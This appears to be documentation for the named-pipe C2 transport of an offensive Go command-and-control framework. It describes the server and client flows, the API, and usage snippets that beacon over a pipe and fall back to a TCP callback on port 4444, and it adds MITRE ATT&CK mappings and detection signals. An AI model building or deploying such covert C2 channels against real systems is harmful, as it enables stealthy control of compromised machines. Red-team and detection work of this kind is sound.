# Named Pipe Transport

| Field | Value |
|-------|-------|
| MITRE ATT&CK | T1071.001 Application Layer Protocol |
| Package | `c2/transport/namedpipe` |
| Platform | Windows |
| Detection | Medium |

## What It Does

Provides a C2 transport over Windows named pipes, implementing both client (`transport.Transport`) and server (`transport.Listener`) interfaces. Named pipes are a native IPC mechanism used extensively by Windows services, making pipe-based C2 traffic blend with legitimate OS activity.

## How It Works

### Server Flow

1. `NewListener(name)` validates the pipe name and returns a `PipeListener`.
2. `Accept(ctx)` calls `CreateNamedPipeW` to create a duplex, byte-mode pipe instance (up to 255 concurrent instances, 64 KB buffers).
3. `ConnectNamedPipe` blocks until a client connects. `ERROR_PIPE_CONNECTED` is handled for the race where a client connects between create and wait.
4. The connected handle is wrapped in a `pipeConn` implementing `net.Conn`.

### Client Flow

1. `New(name, timeout)` stores the pipe name and dial timeout.
2. `Connect(ctx)` calls `WaitNamedPipeW` with the configured timeout, then opens the pipe with `CreateFile` (`GENERIC_READ|GENERIC_WRITE`).
3. The handle is wrapped in a `pipeConn` for read/write.

## API

```go
// Client
func New(name string, timeout time.Duration) *Pipe
func (p *Pipe) Connect(ctx context.Context) error
func (p *Pipe) Read(buf []byte) (int, error)
func (p *Pipe) Write(buf []byte) (int, error)
func (p *Pipe) Close() error
func (p *Pipe) RemoteAddr() net.Addr

// Server
func NewListener(name string) (*PipeListener, error)
func (l *PipeListener) Accept(ctx context.Context) (net.Conn, error)
func (l *PipeListener) Close() error
func (l *PipeListener) Addr() net.Addr
```

## Usage

### Standalone

```go
// Server
ln, _ := namedpipe.NewListener(`\\.\pipe\c2agent`)
defer ln.Close()
conn, _ := ln.Accept(ctx)
buf := make([]byte, 4096)
n, _ := conn.Read(buf)
conn.Write([]byte("ack"))

// Client
p := namedpipe.New(`\\.\pipe\c2agent`, 5*time.Second)
p.Connect(ctx)
defer p.Close()
p.Write([]byte("beacon"))
```

### With multicat

```go
cfg := multicat.Config{
    Transports: []transport.Transport{
        namedpipe.New(`\\.\pipe\c2local`, 5*time.Second),
        transport.NewTCP("10.0.0.1:4444", 10*time.Second),
    },
}
mc := multicat.New(cfg)
mc.Connect(ctx)
```

## MITRE ATT&CK

| Tactic | Technique | ID |
|--------|-----------|----|
| Command and Control | Application Layer Protocol | T1071.001 |
| Execution | Inter-Process Communication | T1559 |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 |

## Detection

| Signal | Detail |
|--------|--------|
| Named pipe creation | Sysmon Event ID 17/18 logs pipe creation and connection |
| Pipe name pattern | Non-standard pipe names outside known Windows services |
| SMB traffic | Named pipe access over SMB (port 445) for lateral movement |
| Handle inspection | Process handle enumeration reveals open pipe handles |

**Rating: Medium** -- Named pipes are heavily used by legitimate Windows services, making detection reliant on pipe name heuristics and behavioral analysis rather than simple signature matching.
